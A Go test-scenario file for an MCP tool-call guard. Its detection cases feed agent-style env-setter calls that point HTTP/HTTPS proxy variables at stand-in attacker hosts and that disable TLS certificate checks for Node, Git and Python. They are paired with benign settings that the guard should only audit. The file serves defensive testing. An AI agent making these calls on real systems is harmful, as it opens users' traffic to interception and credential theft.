// Hand-curated MCP test scenarios for issue #2039:
// HTTP proxy env-setter MITM injection and TLS verification bypass via env-setter tools.
//
// Rules covered:
//   mcp-privesc-block-proxy-env-setter-mitm         (BLOCK name=HTTP_PROXY/HTTPS_PROXY/ALL_PROXY → external URL)
//   mcp-privesc-block-proxy-env-setter-mitm-key-arg (BLOCK key=HTTP_PROXY/... → external URL)
//   mcp-privesc-block-tls-env-setter-bypass         (BLOCK name=NODE_TLS_REJECT_UNAUTHORIZED/GIT_SSL_NO_VERIFY/PYTHONHTTPSVERIFY)
//   mcp-privesc-block-tls-env-setter-bypass-key-arg (BLOCK key=... companion)

package scenarios

var ProxyEnvSetterScenarios2039 = []Scenario{
	// ── TP: HTTP_PROXY / HTTPS_PROXY / ALL_PROXY via 'name' arg ────────────────

	{
		ID:               "MCP-TP-2039-001",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "HTTPS_PROXY", "value": "http://attacker.com:8080"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm",
		Description:      "HTTPS_PROXY set to attacker domain via set_env_var — routes all HTTPS traffic through attacker proxy",
	},
	{
		ID:               "MCP-TP-2039-002",
		ToolName:         "set_environment",
		Arguments:        map[string]interface{}{"name": "HTTP_PROXY", "value": "https://evil-proxy.net/intercept"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm",
		Description:      "HTTP_PROXY set to attacker domain via set_environment — intercepts all HTTP traffic",
	},
	{
		ID:               "MCP-TP-2039-003",
		ToolName:         "configure_env",
		Arguments:        map[string]interface{}{"name": "ALL_PROXY", "value": "http://malicious-proxy.evil.com:3128"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm",
		Description:      "ALL_PROXY set to attacker domain — catches all protocols (HTTP, HTTPS, SOCKS)",
	},
	{
		ID:               "MCP-TP-2039-004",
		ToolName:         "put_env",
		Arguments:        map[string]interface{}{"name": "http_proxy", "value": "http://interception.attacker.com/"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm",
		Description:      "http_proxy (lowercase) set to attacker domain — many Linux tools honor lowercase variant",
	},

	// ── TP: HTTP_PROXY via 'key' arg ────────────────────────────────────────────

	{
		ID:               "MCP-TP-2039-005",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"key": "HTTPS_PROXY", "value": "http://attacker.com:8080"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm-key-arg",
		Description:      "HTTPS_PROXY set via 'key' arg convention — key-arg companion rule",
	},
	{
		ID:               "MCP-TP-2039-006",
		ToolName:         "set_env",
		Arguments:        map[string]interface{}{"key": "HTTP_PROXY", "value": "https://evil-proxy.attacker.net:3128"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm-key-arg",
		Description:      "HTTP_PROXY set via 'key' arg convention to HTTPS domain — variant proxy injection",
	},

	// ── TP: TLS bypass vars via 'name' arg ──────────────────────────────────────

	{
		ID:               "MCP-TP-2039-007",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "NODE_TLS_REJECT_UNAUTHORIZED", "value": "0"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-tls-env-setter-bypass",
		Description:      "NODE_TLS_REJECT_UNAUTHORIZED=0 disables Node.js TLS cert validation entirely",
	},
	{
		ID:               "MCP-TP-2039-008",
		ToolName:         "set_environment",
		Arguments:        map[string]interface{}{"name": "GIT_SSL_NO_VERIFY", "value": "1"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-tls-env-setter-bypass",
		Description:      "GIT_SSL_NO_VERIFY=1 disables TLS verification for all Git operations",
	},
	{
		ID:               "MCP-TP-2039-009",
		ToolName:         "configure_env",
		Arguments:        map[string]interface{}{"name": "PYTHONHTTPSVERIFY", "value": "0"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-tls-env-setter-bypass",
		Description:      "PYTHONHTTPSVERIFY=0 disables Python urllib HTTPS certificate verification",
	},
	{
		ID:               "MCP-TP-2039-010",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"name": "NODE_TLS_REJECT_UNAUTHORIZED", "value": "false"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-tls-env-setter-bypass",
		Description:      "NODE_TLS_REJECT_UNAUTHORIZED=false (string 'false') disables Node.js TLS",
	},

	// ── TP: TLS bypass vars via 'key' arg ───────────────────────────────────────

	{
		ID:               "MCP-TP-2039-011",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"key": "NODE_TLS_REJECT_UNAUTHORIZED", "value": "0"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-tls-env-setter-bypass-key-arg",
		Description:      "NODE_TLS_REJECT_UNAUTHORIZED=0 via 'key' arg convention — key-arg companion",
	},
	{
		ID:               "MCP-TP-2039-012",
		ToolName:         "set_env",
		Arguments:        map[string]interface{}{"key": "GIT_SSL_NO_VERIFY", "value": "1"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-tls-env-setter-bypass-key-arg",
		Description:      "GIT_SSL_NO_VERIFY=1 via 'key' arg convention — key-arg companion",
	},

	// ── TN: benign env-setter calls ─────────────────────────────────────────────

	{
		ID:               "MCP-TN-2039-001",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "PORT", "value": "3000"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm",
		Description:      "Setting PORT env var — completely benign, no proxy or TLS involvement",
	},
	{
		ID:               "MCP-TN-2039-002",
		ToolName:         "set_environment",
		Arguments:        map[string]interface{}{"name": "NODE_ENV", "value": "production"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm",
		Description:      "NODE_ENV=production — legitimate application environment config",
	},
	{
		ID:               "MCP-TN-2039-003",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "HTTPS_PROXY", "value": "http://localhost:8080"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm",
		Description:      "HTTPS_PROXY pointing to localhost — legitimate local debugging proxy (Charles, mitmproxy)",
	},
	{
		ID:               "MCP-TN-2039-004",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "HTTPS_PROXY", "value": "http://127.0.0.1:3128"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm",
		Description:      "HTTPS_PROXY pointing to 127.0.0.1 — legitimate loopback proxy config",
	},
	{
		ID:               "MCP-TN-2039-005",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "DATABASE_URL", "value": "https://db.example.com/mydb"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm",
		Description:      "DATABASE_URL with external domain — not a proxy var, should not trigger proxy rule",
	},
	{
		ID:               "MCP-TN-2039-006",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "GIT_AUTHOR_NAME", "value": "Alice Developer"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-tls-env-setter-bypass",
		Description:      "Setting GIT_AUTHOR_NAME — Git identity variable, no TLS impact",
	},
	{
		ID:               "MCP-TN-2039-007",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "NODE_OPTIONS", "value": "--max-old-space-size=4096"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-tls-env-setter-bypass",
		Description:      "NODE_OPTIONS for memory tuning — legitimate performance config (not TLS bypass)",
	},
	{
		ID:               "MCP-TN-2039-008",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"key": "PORT", "value": "8080"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-proxy-env-setter-mitm-key-arg",
		Description:      "PORT set via key arg — benign port configuration",
	},
	{
		ID:               "MCP-TN-2039-009",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "DEBUG", "value": "true"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-tls-env-setter-bypass",
		Description:      "DEBUG=true — legitimate debug flag, no security impact",
	},
}
